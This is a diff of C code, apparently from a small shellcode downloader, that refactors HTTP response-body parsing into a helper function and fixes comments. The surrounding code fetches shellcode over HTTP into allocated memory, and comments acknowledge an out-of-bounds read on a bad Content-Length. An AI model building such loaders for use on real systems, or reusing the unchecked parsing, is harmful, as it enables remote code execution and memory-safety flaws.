@@ -12,15 +12,22 @@
 #define MAX_RESPONSE_BUFFER 73728  //  extra 8192 bytes for headers
 
 /**
+ * Get the body of the HTTP response
+ * @param full_response the entire http response, including headers
+ * @return A valid pointer to the start of the HTTP body, or NULL if failed.
+ */
+char* get_response_body(char* full_response);
+
+/**
  * Get the value of an HTTP header.
  * @param headers a string containing the entire http headers without the body.
  * @param header the header to look for (ex. "Content-Length").
  * 			Length cannot be greater than MAX_HEADER_BUFFER (64)
  * @param value where the result should be stored.
- * 			Buffer length shuold equal to the max parameter.
+ * 			Buffer length should equal to the max parameter.
  * 			Will always be null terminated
  * @param max max number of characters to read, including the null terminator.
- * @return 0 indicating success, or -1 if failed
+ * @return 0 indicating success, or -1 if failed.
  */
 int get_http_header(char* headers, char* header, char* value, size_t max);
 
@@ -66,6 +73,14 @@ int main(int argc, const char** argv) {
 	// free allocated shellcode
 	free(shellcode);
 	return 0;
+}
+
+char* get_response_body(char* full_response) {
+	char* out = NULL;
+	// results in out of bound reads if the content-length is greater than the actual body
+	if ((out = strstr(full_response, "\r\n\r\n")) == NULL) return NULL;  // misformatted
+	out += 4 * sizeof(char);
+	return out;
 }
 
 int get_http_header(char* headers, char* header, char* value, size_t max) {
@@ -162,9 +177,8 @@ size_t get_shellcode(void** shellcode,
 
 	// results in out of bound reads if the content-length is greater than the actual body
 	char* beginning_of_binary = NULL;
-	if ((beginning_of_binary = strstr(http_response, "\r\n\r\n")) == NULL) return -1;  // misformatted
-	beginning_of_binary += 4 * sizeof(char);
-	printf("%s\n", beginning_of_binary);
+	if ((beginning_of_binary = get_response_body(http_response)) == NULL) return -1;
+	printf("%.*s\n", content_length, beginning_of_binary);
 
 	size_t size = sizeof(hello_code) - 1;  // content-length
 	(*shellcode) = malloc(size);  // allocate memory to store shellcode
